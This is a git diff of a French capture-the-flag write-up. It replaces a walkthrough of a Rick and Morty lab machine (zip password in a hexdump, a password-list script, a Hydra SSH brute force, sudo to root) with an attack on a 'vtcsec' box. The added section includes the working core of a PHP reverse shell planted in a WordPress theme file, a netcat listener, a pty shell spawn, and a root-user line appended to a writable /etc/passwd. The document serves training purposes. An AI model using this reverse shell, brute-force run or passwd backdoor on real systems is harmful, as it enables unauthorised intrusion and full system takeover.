+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?> 
+```
+
+
+En lancent un client netcat du coté kali via 
 ```bash
-[Summer@localhost ftp]$ less FLAG.txt | tail -10
-FLAG{Whoa this is unexpected} - 10 Points
+nc -l -v -p 1234
 ```
 
-l'exploration du dossier `pub` ne donne rien.
-
-Après de longues recherches il semble que Summer ait accès au /home de tous les utilisateurs
-
-```bash
-[Summer@localhost home]$ ls -la
-total 0
-drwxr-xr-x.  5 root        root         52 Aug 18  2017 .
-dr-xr-xr-x. 17 root        root        236 Aug 18  2017 ..
-drwxr-xr-x.  2 Morty       Morty       131 Sep 15  2017 Morty
-drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21  2017 RickSanchez
-drwx------.  2 Summer      Summer       99 Jun  8 03:31 Summer
-```
-
-Il semble y avoir un executable "safe" dans le home de Rick 
-
-```
-[Summer@localhost RICKS_SAFE]$ ls -la
-total 12
-drwxr-xr-x. 2 RickSanchez RickSanchez   18 Sep 21  2017 .
-drwxr-xr-x. 4 RickSanchez RickSanchez  113 Sep 21  2017 ..
--rwxr--r--. 1 RickSanchez RickSanchez 8704 Sep 21  2017 safe
-[Summer@localhost RICKS_SAFE]$ file safe 
-safe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6788eee358d9e51e369472b52e684b7d6da7f1ce, not stripped
-```
-
-Dans le doute, je le garde sous la main, mais ne le lance pas.
-
-Dans le dossier de morty nous avons deux fichier une archive avec un mot de passe et une image, 
-
-
-L'immage semble comropue.
-
-Dans le fichier nous avons
-```
-[Summer@localhost Morty]$ hexdump -C Safe_Password.jpg 
-00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 60  |......JFIF.....`|
-00000010  00 60 00 00 ff e1 00 8c  45 78 69 66 00 00 4d 4d  |.`......Exif..MM|
-00000020  00 2a 00 00 00 08 00 05  01 12 00 03 00 00 00 01  |.*..............|
-00000030  00 01 00 00 01 1a 00 05  00 00 00 01 00 00 00 4a  |...............J|
-00000040  01 1b 00 05 00 00 00 01  00 00 00 52 01 28 00 03  |...........R.(..|
-00000050  00 00 00 01 00 02 00 00  87 69 00 04 00 00 00 01  |.........i......|
-00000060  00 00 00 5a 00 00 00 00  00 00 00 60 00 00 00 01  |...Z.......`....|
-00000070  00 00 00 60 00 00 00 01  00 03 a0 01 00 03 00 00  |...`............|
-00000080  00 01 00 01 00 00 a0 02  00 04 00 00 00 01 00 00  |................|
-00000090  03 50 a0 03 00 04 00 00  00 01 00 00 04 38 00 00  |.P...........8..|
-000000a0  00 00 ff ed 00 38 20 54  68 65 20 53 61 66 65 20  |.....8 The Safe |
-000000b0  50 61 73 73 77 6f 72 64  3a 20 46 69 6c 65 3a 20  |Password: File: |
-000000c0  2f 68 6f 6d 65 2f 4d 6f  72 74 79 2f 6a 6f 75 72  |/home/Morty/jour|
-000000d0  6e 61 6c 2e 74 78 74 2e  7a 69 70 2e 20 50 61 73  |nal.txt.zip. Pas|
-000000e0  73 77 6f 72 64 3a 20 4d  65 65 73 65 65 6b 00 38  |sword: Meeseek.8|
-000000f0  42 49 4d 04 04 00 00 00  00 00 00 38 42 49 4d 04  |BIM........8BIM.|
-00000100  25 00 00 00 00 00 10 d4  1d 8c d9 8f 00 b2 04 e9  |%...............|
-00000110  80 09 98 ec f8 42 7e ff  c0 00 11 08 04 38 03 5
-```
-Password : `Meeseek`
-
-Impossible de dezipper l'archive car Morty en est le propietaire, heureusement après copy, dans le `homedir` nous somme bon.
-
-
-```
-[Summer@localhost Morty]$ unzip journal.txt.zip 
-Archive:  journal.txt.zip
-[journal.txt.zip] journal.txt password: 
-password incorrect--reenter: 
-error:  cannot create journal.txt
-        Permission denied
-```
-
-```
-[Summer@localhost Morty]$ cp journal.txt.zip ~/journal.txt.zip
-[Summer@localhost Morty]$ cd 
-[Summer@localhost ~]$ unzip journal.txt.zip 
-Archive:  journal.txt.zip
-[journal.txt.zip] journal.txt password: 
-  inflating: journal.txt             
-[Summer@localhost ~]$ ls
-FLAG.txt  journal.txt  journal.txt.zip
-[Summer@localhost ~]$ less FLAG.txt | tail -10
-FLAG{Get off the high road Summer!} - 10 Points
-[Summer@localhost ~]$ less journal.txt
-[Summer@localhost ~]$ less journal.txt | tail -10
-Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
-
-Anyway. Here it is:
-
-FLAG: {131333} - 20 Points 
-[Summer@localhost ~]$ 
-
-```
-Nous avons le password du safe de rick
-
-***Identification du Flag n°6***
- `FLAG: {131333} - 20 Points`
-
-
-***Ouverture du safe de Rick après copie***
-```bash
-[Summer@localhost ~]$ ./safe 131333
-decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
-
-Ricks password hints:
- (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
-Follow these clues, in order
-
-
-1 uppercase character
-1 digit
-One of the words in my old bands name.� @
-```
-
-
-***Identification du Flag n°7***
-`FLAG{And Awwwaaaaayyyy we Go!} - 20 Points`
-
-Petite enquette en OSINT pour trouver le nom du groupe de Rick.
-
-
-
-![](https://image.noelshack.com/fichiers/2022/23/3/1654681073-20220698-111620.png)
-
-
-Generation du mot des mots de passe candidat
-
-***Script de géneration des mots de passe***
+et en chragant la page `http://vtcsec/secret/wp-content/themes/twentyseventeen/archive.php` 
+j'obtient la main sur un pseudo shell. 
+graçe à python je spawn un shell.
 ```python
-└─$ cat passwordMaker.py 
-import string
-
-band_name = "The Flesh Curtains"
-
-for letter in string.ascii_uppercase:
-        for digit in range(0,10):
-                for word in band_name.split():
-                        print(letter+str(digit)+word)
+import pty; pty.spawn('/bin/bash')
 ```
 
+Les scripts `linpeas`, me perment de détecter entre autres TRES nombreux vecteurs d'attaque, que le fichier /etc/passwd est authorisée en écriture.
 
-Utilisation  d'hydra pour chercher a passer en SSH, dans le doute on va tester tous les mots de passe sur `root` et sur `RickSanchez`
+je l'utilise donc comme vetceur d'attaque : 
+```bash
+echo "root2:MlNmbwLb2K0bo:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+Je passe en su de mon utilisateur `root2`
 
 ```bash
-└─$ hydra -L /home/kali/Documents/Cours/Rickdiculously/script/users -P /home/kali/Documents/Cours/Rickdiculously/script/passwords -u -s 22222  10.0.2.4 ssh -t 4
-Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+www-data@vtcsec:/tmp$ su root2
+su root2
+Password: root
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-07 18:48:08
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 1560 login tries (l:2/p:780), ~390 tries per task
-[DATA] attacking ssh://10.0.2.4:22222/
-[STATUS] 58.00 tries/min, 58 tries in 00:01h, 1502 to do in 00:26h, 4 active
-[STATUS] 36.00 tries/min, 108 tries in 00:03h, 1452 to do in 00:41h, 4 active
-[STATUS] 34.29 tries/min, 240 tries in 00:07h, 1320 to do in 00:39h, 4 active
-[STATUS] 32.92 tries/min, 395 tries in 00:12h, 1165 to do in 00:36h, 4 active
-[STATUS] 32.47 tries/min, 552 tries in 00:17h, 1008 to do in 00:32h, 4 active
-[STATUS] 32.32 tries/min, 711 tries in 00:22h, 849 to do in 00:27h, 4 active
-[STATUS] 34.59 tries/min, 934 tries in 00:27h, 626 to do in 00:19h, 4 active
-[22222][ssh] host: 10.0.2.4   login: RickSanchez   password: P7Curtains
-[STATUS] 38.34 tries/min, 1227 tries in 00:32h, 333 to do in 00:09h, 4 active
-[STATUS] 41.27 tries/min, 1527 tries in 00:37h, 33 to do in 00:01h, 4 active
-[STATUS] 41.05 tries/min, 1560 tries in 00:38h, 1 to do in 00:01h, 2 active
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-07 19:26:09
-```
+root@vtcsec:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+``` 
+Et me voila root.
+
+Il y'avait de nobreuses autres options notament : 
+- Via le serveur SQL
+- Via certaine librairie libre en écriture, 
+- Via les crontabs
+- Via le SSH (BRUTE FORCE)
 
 
-Connextion au travers de RickSanchez en ssh
-
-***Passage en Su grace a sudo***
-
-```
-[RickSanchez@localhost ~]$ sudo su
-[sudo] password for RickSanchez: 
-[root@localhost RickSanchez]# ls
-RICKS_SAFE  ThisDoesntContainAnyFlags
-[root@localhost RickSanchez]# cd
-[root@localhost ~]# ls
-anaconda-ks.cfg  FLAG.txt
-[root@localhost ~]# less FLAG.txt | tail -10
-FLAG: {Ionic Defibrillator} - 30 points
-[root@localhost ~]# 
-
-```
-
-***Identification du Flag n°8***
-`FLAG: {Ionic Defibrillator} - 30 points`
+##
 
 
-
+ 
 
